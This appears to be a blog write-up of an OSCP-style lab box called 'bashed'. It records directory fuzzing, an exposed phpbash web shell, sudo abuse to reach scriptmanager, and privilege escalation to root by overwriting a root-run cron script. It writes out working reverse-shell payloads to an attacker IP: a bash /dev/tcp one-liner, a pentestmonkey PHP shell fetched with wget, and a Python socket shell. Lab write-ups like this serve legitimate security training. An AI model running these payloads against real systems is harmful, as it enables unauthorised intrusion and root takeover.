---
layout: post
title: "bashed"
date: 2025-09-02 
categories: OSCP Playlist
---
# bashed

## Summary:

- Fuzzed and found /dev dir which served a phpbash
- sudo -l to find we can execute as another user
- upload php reverse shell
- found script executed by root routinely
- got reverse shell executed as user root

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV 10.10.10.68 -oN nmap/bashed

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

```

Let’s visit the web page

![image.png]({{ site.baseurl }}/assets/bashed/image.png)

Let’s fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.68/FUZZ -ic

images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 27ms]
                        [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 33ms]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 25ms]
php                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 23ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 29ms]
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 25ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 29ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 24ms]
                        [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 20ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 23ms]
```

We go on the /dev/ directory we find phpbash web shell.

![image.png]({{ site.baseurl }}/assets/bashed/image%201.png)

We look in /home dir we find two users:

```bash
ls -l

total 8
drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 arrexel
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec 4 2017 scriptmanager
```

Let’s check our sudo privileges:

```bash
sudo -l

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Seems like we can execute any commands as scriptmanager. Let’s go into scriptmanager dir:

```bash
sudo -u scriptmanager cat .bash_history

#nothing
```

Let’s see what files/dir are owned by scriptmanager

```bash
find / -user scriptmanager 2>/dev/null

/scripts
find: '/scripts/test.py': Permission denied
find: '/scripts/test.txt': Permission denied

sudo -u scriptmanager find / -user scriptmanager 2>/dev/null
```

Let’s cat them out

```bash

sudo -u scriptmanager -i

sudo -u scriptmanager cat scripts/test.txt
sudo -u scriptmanager cat scripts/test.py

sudo -u scriptmanager crontab -l
```

Not much. Let’s get a reverse shell so it’s easier to navigate

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.7/9001 0>&1'
```

Does not work. Let’s upload a php reverse shell as we know that the web executes php code. We download the reverse shell from pentest monkey and edit the IP address and port number

```bash
$ip = '10.10.16.7';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```

Now let’s start a python server and transfer the file over:

```bash
python3 -m http.server 8001

#on target
cd /var/www/html/uploads
wget http://10.10.16.7:8001/rev.php
```

Now start a listener and visit the page:

```bash
nc -lnvp 4444

#On browser
http://10.10.10.68/uploads/rev.php
```

![image.png]({{ site.baseurl }}/assets/bashed/image%202.png)

upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now we can switch to scriptmanager user with su:

```bash
sudo -u scriptmanager -i

cd /scripts

ls -la

-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Sep  2 02:04 test.txt

```

```bash
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

```

It seems like root is executing [test.py](http://test.py). Let’s get it to execute a python reverse shell instead:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > test.py
```

Start listener:

```bash
	nc -lnvp 9001
```

We can test out if the script works by executing it. After a few minutes, we have root